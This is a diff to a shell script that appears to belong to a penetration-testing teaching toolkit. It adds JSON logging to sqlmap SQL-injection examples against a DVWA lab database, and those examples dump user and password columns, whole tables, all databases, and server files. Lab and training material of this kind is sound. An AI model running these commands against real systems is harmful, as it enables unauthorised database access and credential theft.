@@ -28,6 +28,8 @@ require_cmd sqlmap "brew install sqlmap"
 
 TARGET="${1:-}"
 
+json_set_meta "sqlmap" "$TARGET" "sql-injection"
+
 confirm_execute "${1:-}"
 safety_banner
 
@@ -59,21 +61,29 @@ run_or_show "1) Detect SQL injection and list databases" \
 info "2) List tables in a specific database"
 echo "   sqlmap -u ${URL} --batch -D dvwa --tables"
 echo ""
+json_add_example "List tables in a specific database" \
+    "sqlmap -u ${URL} --batch -D dvwa --tables"
 
 # 3. List columns in a table
 info "3) List columns in a table"
 echo "   sqlmap -u ${URL} --batch -D dvwa -T users --columns"
 echo ""
+json_add_example "List columns in a table" \
+    "sqlmap -u ${URL} --batch -D dvwa -T users --columns"
 
 # 4. Dump specific columns
 info "4) Dump specific columns from a table"
 echo "   sqlmap -u ${URL} --batch -D dvwa -T users -C user,password --dump"
 echo ""
+json_add_example "Dump specific columns from a table" \
+    "sqlmap -u ${URL} --batch -D dvwa -T users -C user,password --dump"
 
 # 5. Dump entire table
 info "5) Dump an entire table"
 echo "   sqlmap -u ${URL} --batch -D dvwa -T users --dump"
 echo ""
+json_add_example "Dump an entire table" \
+    "sqlmap -u ${URL} --batch -D dvwa -T users --dump"
 
 # 6. Dump all databases
 run_or_show "6) Dump all databases (caution: can be very large)" \
@@ -87,6 +97,8 @@ run_or_show "7) Use specific injection technique" \
 info "8) Dump with CSV format output"
 echo "   sqlmap -u ${URL} --batch -D dvwa -T users --dump --csv-del=\",\""
 echo ""
+json_add_example "Dump with CSV format output" \
+    "sqlmap -u ${URL} --batch -D dvwa -T users --dump --csv-del=\",\""
 
 # 9. Read a file from the server
 run_or_show "9) Read a file from the server (requires FILE privileges)" \
@@ -95,6 +107,8 @@ run_or_show "9) Read a file from the server (requires FILE privileges)" \
 # 10. Full automated dump workflow
 run_or_show "10) Full automated dump workflow" \
     sqlmap -u "$URL" --batch --dbs --tables --dump --threads=5
+
+json_finalize
 
 # Interactive demo (skip if non-interactive)
 if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
